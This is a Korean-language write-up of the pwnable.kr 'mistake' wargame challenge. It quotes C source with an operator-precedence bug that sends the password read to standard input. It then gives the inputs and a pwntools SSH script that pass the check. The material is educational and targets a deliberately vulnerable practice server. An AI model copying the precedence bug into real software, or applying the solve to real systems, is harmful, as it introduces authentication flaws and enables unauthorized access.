---
title: "[pwnable.kr]Toddler/mistake"
tags: [pwnable.kr, Toddler's Bottle, writeup]
author: eli_ez3r
key: 20180918
modify_date: 2018-09-18
article_header:
  type: cover
  image:
    src: /assets/img/write-up/pwnable_kr.png
---

-----

```
We all make mistakes, let's move on.
(don't take this too seriously, no fancy hacking skill is required at all)

This task is based on real event
Thanks to dhmonkey

hint : operator priority

ssh mistake@pwnable.kr -p2222 (pw:guest)
```

-----

```c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
        int i;
        for(i=0; i<len; i++){
                s[i] ^= XORKEY;
        }
}

int main(int argc, char* argv[]){

        int fd;
        if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
                printf("can't open password %d\n", fd);
                return 0;
        }

        printf("do not bruteforce...\n");
        sleep(time(0)%20);

        char pw_buf[PW_LEN+1];
        int len;
        if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
                printf("read error\n");
                close(fd);
                return 0;
        }

        char pw_buf2[PW_LEN+1];
        printf("input password : ");
        scanf("%10s", pw_buf2);

        // xor your input
        xor(pw_buf2, 10);

        if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
                printf("Password OK\n");
                system("/bin/cat flag\n");
        }
        else{
                printf("Wrong Password\n");
        }

        close(fd);
        return 0;
}
```

`mistake.c`파일을 열어보면 위와 같다.

-----

### 0x00. Analysis

무작위공격을 방지하기 위해 최대 19초의 sleep을 걸어준다.

그리고 `password` 파일을 열어 내용을 읽어 `pw_buf`에 저장한다. 이후 사용자로 부터 비밀번호를 입력받아 1과 xor한 후 그 값을 `pw_buf`와 비교하여 맞으면 문제가 풀린다. 

Really???

이렇게 코드를 분석 했다면 **당신은 문제를 풀 수 없다. ㅋㅋㅋㅋㅋㅋ**

-----

### 0x01. Real Analysis

```c
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
    printf("can't open password %d\n", fd);
    return 0;
}
```

이 부분을 자세히 살펴보자. 

```c
fd = open("/home/mistake/password",O_RDONLY,0400) < 0
```

특히 이부분이다.

우리가 순간적으로 코드를 분석 할 때, password파일을 열고 해당 파일의 디스크립터 번호가 fd에 들어가며 그 값이 0보다 작으면 if문이 실행된다고 생각하지만...

**[!] 아니다.**

소스코드를 보면 연산자가  2가지가 존재한다. `=` 와 `<` 가 있다. 두개의 연산자 중에서 `<`가 우선 순위가 더 높다.

이렇게 되면 분석이 완전히 달라진다.

`open()` 함수가 실행되고 나서 파일 디스크립트 번호가 부여된다. 파일이 존재하면 이 값은 항상 0보다 클 것이다. 예를들어 `3`이라는 값을 부여받았을 때, `3 < 0` 의 결과는 `False`가 된다.  False는 `0`의 값을 가지므로, `fd`에 `0`이 대입되게 된다.

```c
if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
    printf("read error\n");
    close(fd);
    return 0;
}
```

이후 if문에서 `read`가 실행되는데, 이때 `fd`값이 `0` 이므로, 키보드로 부터 값을 입력받게 된다.

> 그래서 19초가 지나도 반응이 없다가 엔터를 쳐야 "input password :" 텍스트가 보였던 것!!!

따라서, 사용자가 `pw_buf`와 `pw_buf2`의 값을 모두 입력할 수 있다는 것이다.

-----

### 0x02. Exploit

`pw_buf2` ^ `1` = `pw_buf` 이면 되므로,

```
mistake@prowl:~$ ./mistake
do not bruteforce...
1111111111
input password : 0000000000
Password OK
Mommy, the operator priority always confuses me :(
```

끄읏....!!

-----

```python
from pwn import *
import time

conn = ssh("mistake", "pwnable.kr", port=2222, password="guest")
p = conn.process("./mistake")

p.recv()
time.sleep(20)
p.sendline("1111111111")
p.recvuntil("input password : ")
p.sendline("0000000000")

print p.recv()
p.close()
conn.close()
```

-----

